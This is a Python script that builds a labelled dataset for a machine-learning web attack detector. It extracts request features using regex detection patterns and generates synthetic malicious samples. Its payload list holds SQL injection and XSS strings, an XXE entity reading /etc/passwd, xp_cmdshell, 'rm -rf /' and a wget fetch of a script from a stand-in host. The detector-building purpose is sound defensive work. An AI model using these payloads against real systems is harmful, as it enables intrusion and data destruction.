import pandas as pd
import json
import re
from pathlib import Path
from typing import List, Dict, Optional
from faker import Faker
import random
from scipy.stats import entropy
import numpy as np
from urllib.parse import urlparse, parse_qs

fake = Faker()

FEATURE_COLS = [
    'url_length', 'num_special_chars', 'contains_sql_keywords', 'contains_xss_patterns',
    'contains_path_traversal', 'request_length', 'request_time', 'is_get_method',
    'is_post_method', 'ua_length', 'is_common_browser', 'content_entropy', 'num_digits',
    'num_uppercase', 'sensitive_path_access', 'admin_path_access', 'num_directory_levels',
    'has_encrypted_content', 'ssl_protocol_indicators', 'weak_cipher_indicators',
    'contains_command_injection', 'contains_ldap_injection', 'injection_pattern_score',
    'contains_xxe_patterns', 'unusual_headers', 'suspicious_content_types',
    'auth_related_paths', 'credential_like_patterns', 'bruteforce_indicators',
    'contains_serialized_data', 'deserialization_indicators', 'contains_ssrf_patterns',
    'internal_ip_indicators', 'localhost_references', 'parameter_count',
    'unusual_parameter_names'
]

COMMON_BROWSERS = ['mozilla', 'chrome', 'firefox', 'safari', 'edge', 'msie', 'opera', 'webkit']

class HTTPFeatureExtractor:
    SQL_KEYWORDS = r'\b(union\s+select|select\s+.*\s+from|insert\s+into|drop\s+table|update\s+.*\s+set|delete\s+from|exec\s*\(|sleep\s*\(|waitfor\s+delay|benchmark\s*\()\b'
    XSS_PATTERNS = r'\b(script\s*>|javascript:|onerror\s*=|onload\s*=|onmouseover\s*=|alert\s*\(|document\.cookie|eval\s*\(|fromcharcode\s*\(|window\.location)\b|<script\s*>'
    PATH_TRAVERSAL = r'\.\./|\.\.\\|%2e%2e%2f|%2e%2e%5c|\.%00|\.\.%00|/\.\./|\\\.\.\\'
    COMMAND_INJECTION = r'[;&|`]\s*(ls|cat|rm|wget|curl|nc|netcat|bash|sh|cmd|powershell)\b'
    SSRF_PATTERNS = r'(https?|ftp|file|gopher|dict)://(127\.0\.0\.1|localhost|192\.168|10\.|172\.(1[6-9]|2[0-9]|3[0-1]))\b'
    SENSITIVE_PATHS = r'/(admin|config|database|backup|\.git|\.env|\.htaccess|phpmyadmin|mysql|wp-admin|\.svn|\.idea)\b'
    ADMIN_KEYWORDS = r'\b(admin|root|administrator|superuser|sysadmin)\b'
    LDAP_INJECTION = r'\(\w+=.*\)|\\*\w+\\*|\bnull\s+.*\s+null\b'
    XXE_PATTERNS = r'<!ENTITY\s+|<!DOCTYPE\s+.*SYSTEM|%[a-f0-9]{2};|&[a-z]+;'
    WEAK_CIPHER_INDICATORS = r'\b(SSLv2|SSLv3|TLSv1\.0|RC4|DES|MD5|SHA1)\b'
    AUTH_PATHS = r'/(login|signin|auth|authenticate|oauth|sso)\b'
    CREDENTIAL_PATTERNS = r'\b(password|passwd|pwd|secret|key|token|auth)\b'
    SERIALIZATION_PATTERNS = r'\b(rO0|base64|serialized|deseriali[zs]e)\b'
    INTERNAL_IP = r'\b(127\.0\.0\.1|192\.168\.[0-1]\.[0-9]{1,3}|10\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}|172\.(1[6-9]|2[0-9]|3[0-1])\.[0-9]{1,3}\.[0-9]{1,3})\b'

    @staticmethod
    def _calculate_entropy(text):
        if not text:
            return 0.0
        text = str(text)
        counter = pd.Series(list(text)).value_counts()
        text_length = len(text)
        probabilities = counter / text_length
        return entropy(probabilities.to_numpy()) if len(counter) > 0 else 0.0

    @staticmethod
    def _create_features(request_url: str, method: str, user_agent: str, length: int, time: float, body: str = '') -> Dict[str, any]:
        try:
            content = request_url + body
            content_lower = content.lower()
            content_chars = list(content)
            char_counts = pd.Series(content_chars).value_counts()
            num_digits = sum(c.isdigit() for c in content)
            num_uppercase = sum(c.isupper() for c in content)
            parsed_url = urlparse(request_url)
            query_params = parse_qs(parsed_url.query)

            features = {
                'url_length': len(request_url),
                'num_special_chars': sum(not c.isalnum() for c in content),
                'contains_sql_keywords': sum(1 for _ in re.finditer(HTTPFeatureExtractor.SQL_KEYWORDS, content_lower, re.IGNORECASE)),
                'contains_xss_patterns': sum(1 for _ in re.finditer(HTTPFeatureExtractor.XSS_PATTERNS, content_lower, re.IGNORECASE)),
                'contains_path_traversal': int(bool(re.search(HTTPFeatureExtractor.PATH_TRAVERSAL, content_lower, re.IGNORECASE))),
                'request_length': length,
                'request_time': float(time),
                'is_get_method': int(method.upper() == 'GET'),
                'is_post_method': int(method.upper() == 'POST'),
                'ua_length': len(user_agent),
                'is_common_browser': int(any(b in user_agent.lower() for b in COMMON_BROWSERS)),
                'content_entropy': float(HTTPFeatureExtractor._calculate_entropy(content)),
                'num_digits': num_digits,
                'num_uppercase': num_uppercase,
                'sensitive_path_access': int(bool(re.search(HTTPFeatureExtractor.SENSITIVE_PATHS, request_url, re.IGNORECASE))),
                'admin_path_access': int(bool(re.search(HTTPFeatureExtractor.ADMIN_KEYWORDS, request_url, re.IGNORECASE))),
                'num_directory_levels': request_url.count('/'),
                'has_encrypted_content': int('https://' in request_url.lower()),
                'ssl_protocol_indicators': int('ssl' in content_lower or 'tls' in content_lower),
                'weak_cipher_indicators': int(bool(re.search(HTTPFeatureExtractor.WEAK_CIPHER_INDICATORS, content_lower, re.IGNORECASE))),
                'contains_command_injection': sum(1 for _ in re.finditer(HTTPFeatureExtractor.COMMAND_INJECTION, content_lower, re.IGNORECASE)),
                'contains_ldap_injection': sum(1 for _ in re.finditer(HTTPFeatureExtractor.LDAP_INJECTION, content_lower, re.IGNORECASE)),
                'injection_pattern_score': 0,  # Calculated below
                'contains_xxe_patterns': int(bool(re.search(HTTPFeatureExtractor.XXE_PATTERNS, content_lower, re.IGNORECASE))),
                'unusual_headers': 0,  # Simplified for dataset creation
                'suspicious_content_types': 0,  # Simplified for dataset creation
                'auth_related_paths': int(bool(re.search(HTTPFeatureExtractor.AUTH_PATHS, request_url, re.IGNORECASE))),
                'credential_like_patterns': int(bool(re.search(HTTPFeatureExtractor.CREDENTIAL_PATTERNS, content_lower, re.IGNORECASE))),
                'bruteforce_indicators': int('multiple' in user_agent.lower() or 'bot' in user_agent.lower()),
                'contains_serialized_data': int(bool(re.search(HTTPFeatureExtractor.SERIALIZATION_PATTERNS, content_lower, re.IGNORECASE))),
                'deserialization_indicators': int('serialized' in content_lower or 'deserialize' in content_lower),
                'contains_ssrf_patterns': int(bool(re.search(HTTPFeatureExtractor.SSRF_PATTERNS, content_lower, re.IGNORECASE))),
                'internal_ip_indicators': int(bool(re.search(HTTPFeatureExtractor.INTERNAL_IP, content_lower, re.IGNORECASE))),
                'localhost_references': int('localhost' in content_lower or '127.0.0.1' in content_lower),
                'parameter_count': len(query_params),
                'unusual_parameter_names': int(any('cmd' in key.lower() or 'exec' in key.lower() for key in query_params.keys()))
            }

            features['injection_pattern_score'] = min(
                features['contains_sql_keywords'] * 3 +
                features['contains_xss_patterns'] * 2 +
                features['contains_command_injection'] * 4 +
                features['contains_ldap_injection'] * 2,
                10
            )
            return features
        except Exception as e:
            print(f"Error in _create_features for URL {request_url}: {e}")
            return {col: 0 for col in FEATURE_COLS} | {'is_malicious': 0}

    @staticmethod
    def extract_from_log_line(log_line: str) -> Optional[Dict[str, any]]:
        try:
            log_pattern = (
                r'(\S+) (\S+) (\S+) \[([^\]]+)\] "(\S+) (\S+) (\S+)" (\d+) (\d+) '
                r'"([^"]*)" "([^"]*)" "([^"]*)" Request_Length:(\d+) Request_Time:([0-9.]+)'
            )
            match = re.match(log_pattern, log_line)
            if not match:
                return None
            groups = match.groups()
            try:
                request_length = int(groups[12])
            except Exception:
                request_length = 0
            try:
                request_time = float(groups[13])
            except Exception:
                request_time = 0.0
            features = HTTPFeatureExtractor._create_features(
                request_url=groups[5],
                method=groups[4],
                user_agent=groups[10],
                length=request_length,
                time=request_time
            )
            content = groups[5].lower() + groups[10].lower()
            is_malicious = (
                (bool(re.search(HTTPFeatureExtractor.SQL_KEYWORDS, content, re.IGNORECASE)) and features['content_entropy'] > 3.0) or
                bool(re.search(HTTPFeatureExtractor.XSS_PATTERNS, content, re.IGNORECASE)) or
                (bool(re.search(HTTPFeatureExtractor.PATH_TRAVERSAL, content, re.IGNORECASE)) and features['num_directory_levels'] > 3) or
                bool(re.search(HTTPFeatureExtractor.COMMAND_INJECTION, content, re.IGNORECASE)) or
                bool(re.search(HTTPFeatureExtractor.SSRF_PATTERNS, content, re.IGNORECASE))
            )
            features['is_malicious'] = int(is_malicious)
            return features
        except Exception as e:
            print(f"Error in extract_from_log_line: {e}")
            return None

    @staticmethod
    def extract_from_raw_payload(payload: str, method: str = "GET", user_agent: str = "Malicious User-Agent", body: str = '') -> Dict[str, any]:
        try:
            return HTTPFeatureExtractor._create_features(
                request_url=payload,
                method=method,
                user_agent=user_agent,
                length=len(payload) + len(body),
                time=0.1,
                body=body
            )
        except Exception as e:
            print(f"Error in extract_from_raw_payload for payload {payload[:50]}: {e}")
            return {col: 0 for col in FEATURE_COLS} | {'is_malicious': 1}

def load_jsonl_payloads(filepath: str) -> pd.DataFrame:
    print(f"Loading JSON payloads from {filepath}...")
    data = []
    with open(filepath, 'r', encoding='utf-8') as f:
        try:
            arr = json.load(f)
            print(f"Found {len(arr)} payload entries.")
            for entry in arr:
                payload = entry.get('payload', '')
                if payload:
                    ua = random.choice(['Malicious User-Agent', 'curl/7.68.0', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'])
                    features = HTTPFeatureExtractor.extract_from_raw_payload(payload, user_agent=ua)
                    features['is_malicious'] = 1
                    features['source'] = 'jsonl_payloads'
                    data.append(features)
                else:
                    print(f"Skipping empty payload in {filepath}")
        except Exception as e:
            print(f"Error loading JSON array: {e}")
    print(f"Extracted {len(data)} features from payloads")
    return pd.DataFrame(data)

def load_cic_ids2010(filepath: str) -> pd.DataFrame:
    print(f"Loading CIC-IDS2010 data from {filepath}...")
    data = []
    try:
        df = pd.read_csv(filepath, encoding='latin-1')
        print(f"CSV loaded with {len(df)} rows and {len(df.columns)} columns")
        for _, row in df.iterrows():
            full_url = row.get('URL', '')
            method = row.get('Method', 'GET')
            body = row.get('Body', '') if 'Body' in row else ''
            if isinstance(full_url, str):
                url_no_proto = full_url.split(' ')[0] if ' ' in full_url else full_url
                ua = random.choice(['Mozilla/5.0 ...', 'curl/7.68.0'])
                features = HTTPFeatureExtractor.extract_from_raw_payload(url_no_proto, method, ua, body=body)
                features['is_malicious'] = int(row.get('classification', 0))
                features['source'] = 'cic_ids2010'
                data.append(features)
            else:
                print(f"Skipping invalid URL in {filepath}: {full_url}")
    except Exception as e:
        print(f"Error loading CIC file: {e}")
    print(f"Extracted {len(data)} features from CIC-IDS2010")
    return pd.DataFrame(data)

def load_lab_data(log_filepath: str) -> pd.DataFrame:
    print(f"Loading lab data from {log_filepath}...")
    data = []
    if not Path(log_filepath).exists():
        print("Lab log file not found")
        return pd.DataFrame()
    try:
        with open(log_filepath, 'r', encoding='utf-8') as file:
            for line in file:
                features = HTTPFeatureExtractor.extract_from_log_line(line.strip())
                if features:
                    features['source'] = 'lab'
                    data.append(features)
                else:
                    print(f"Skipping invalid log line in {log_filepath}: {line.strip()[:50]}")
    except Exception as e:
        print(f"Error reading lab log: {e}")
    print(f"Extracted {len(data)} features from lab data")
    return pd.DataFrame(data)

def augment_benign(n_samples: int = 20000) -> List[Dict]:
    print(f"Augmenting {n_samples} benign samples...")
    data = []
    for _ in range(n_samples):
        try:
            body = fake.text(max_nb_chars=random.randint(10, 100))
            url = f"/{fake.uri_path()}"
            method = random.choice(['GET', 'POST'])
            ua = random.choice(['curl/8.1.2', 'curl/7.68.0', f"Mozilla/5.0 ({fake.user_agent()})", 'python-requests/2.28.1'])
            features = HTTPFeatureExtractor._create_features(
                request_url=url,
                method=method,
                user_agent=ua,
                length=len(url) + len(body),
                time=random.uniform(0.01, 0.3),
                body=body
            )
            features['is_malicious'] = 0
            features['source'] = 'augmented_benign'
            data.append(features)
        except Exception as e:
            print(f"Error augmenting benign sample: {e}")
    return data

def augment_malicious(n_samples: int = 30000) -> List[Dict]:  # Increased to 30000
    print(f"Augmenting {n_samples} malicious samples...")
    malicious_payloads = [
        "' OR 'a'='a", "1; DROP TABLE users", "<script>alert('xss')</script>",
        "../etc/passwd", "%2e%2e%2f", "UNION SELECT * FROM users",
        "javascript:alert('hacked')", "eval('malicious_code')",
        "%27%20OR%201%3D1--", "1' OR '1'='1", "<img src=x onerror=alert(1)>",
        "/../../etc/shadow", "SELECT%20*%20FROM%20users%20WHERE%201=1",
        "<script src='http://malicious.com'></script>", "1 AND 1=1--",
        "%3Cscript%3Ealert(1)%3C/script%3E", "admin'--",
        "' OR 1=1--", "<iframe src='javascript:alert(1)'>", "../../windows/system32/config/sam",
        "%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E", "1 OR '1'='1' /*",
        "http://localhost:8080/admin", "; rm -rf /", "<!DOCTYPE entity [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>",
        "ldap://[attacker].com/a", "base64_decode('malicious')", "wget http://malicious.com/script.sh",
        "curl http://192.168.1.1", "eval(phpinfo())", "<object data='javascript:alert(1)'>",
        "1; EXEC xp_cmdshell('dir')", "http://10.0.0.1/config", "<xml><!ENTITY xxe 'attack'>",
        "<scr<script>ipt>alert('xss')</script>", "%27%20UNION%20SELECT%20NULL--",  # Obfuscated XSS and SQL
        "eval(String.fromCharCode(97,108,101,114,116,40,39,120,115,115,39,41))",  # Obfuscated JS
        "../.././../etc/passwd%00", "ldap://127.0.0.1:389/ou=users",  # Path traversal and LDAP
        "<![CDATA[<script>alert(1)</script>]]>", "SELECT/*comment*/password FROM users"  # CDATA XSS and SQL comment
    ]
    data = []
    for _ in range(n_samples):
        try:
            payload = random.choice(malicious_payloads) + fake.text(max_nb_chars=20)
            body = fake.text(max_nb_chars=50) if random.random() > 0.5 else payload
            url = f"/{fake.uri_path()}" + (payload if random.random() > 0.5 and not body else '')
            method = random.choice(['GET', 'POST'])
            ua = random.choice(['Malicious UA', 'curl/7.68.0', 'Mozilla/5.0 ...', 'python-requests/2.28.1'])
            features = HTTPFeatureExtractor._create_features(
                request_url=url,
                method=method,
                user_agent=ua,
                length=len(url) + len(body),
                time=random.uniform(0.05, 0.5),
                body=body
            )
            features['is_malicious'] = 1
            features['source'] = 'augmented_malicious'
            data.append(features)
        except Exception as e:
            print(f"Error augmenting malicious sample: {e}")
    return data

def align_and_filter(df: pd.DataFrame) -> pd.DataFrame:
    for col in FEATURE_COLS + ['is_malicious']:
        if col not in df.columns:
            df[col] = 0
    result = df[FEATURE_COLS + ['is_malicious', 'source']].copy()
    result = result.dropna(subset=['is_malicious'] + FEATURE_COLS)
    return result

def main():
    output_file = Path('../datasets/MASTER_training_dataset.csv')
    output_file.parent.mkdir(exist_ok=True)

    master_data = pd.DataFrame()
    sources = [
        ('../datasets/WEB_APPLICATION_PAYLOADS_FIXED.json', load_jsonl_payloads),
        ('../datasets/CIC-IDS2010.csv', load_cic_ids2010),
        ('../logs/access.log', load_lab_data)
    ]

    for path, loader in sources:
        if Path(path).exists():
            df = loader(path)
            master_data = pd.concat([master_data, df], ignore_index=True)
            print(f"{path}: {len(df)} entries loaded")
        else:
            print(f"File not found: {path}")

    aug_benign = pd.DataFrame(augment_benign(20000))
    aug_mal = pd.DataFrame(augment_malicious(25000))
    master_data = pd.concat([master_data, aug_benign, aug_mal], ignore_index=True)

    if not master_data.empty:
        master_data = align_and_filter(master_data)
        master_data = master_data.dropna(subset=['is_malicious'] + FEATURE_COLS)
        master_data.to_csv(output_file, index=False)
        print(f"\n[SUCCESS] Master dataset created with {len(master_data)} entries!")
        print(f"Malicious: {master_data['is_malicious'].sum()}")
        print(f"Benign: {len(master_data) - master_data['is_malicious'].sum()}")
        print(f"Saved to: {output_file}")

        print("\nPreview of the dataset:")
        print(master_data.head(10))
    else:
        print("\n[ERROR] No data was loaded. Check your file paths and data sources.")

if __name__ == '__main__':
    main()
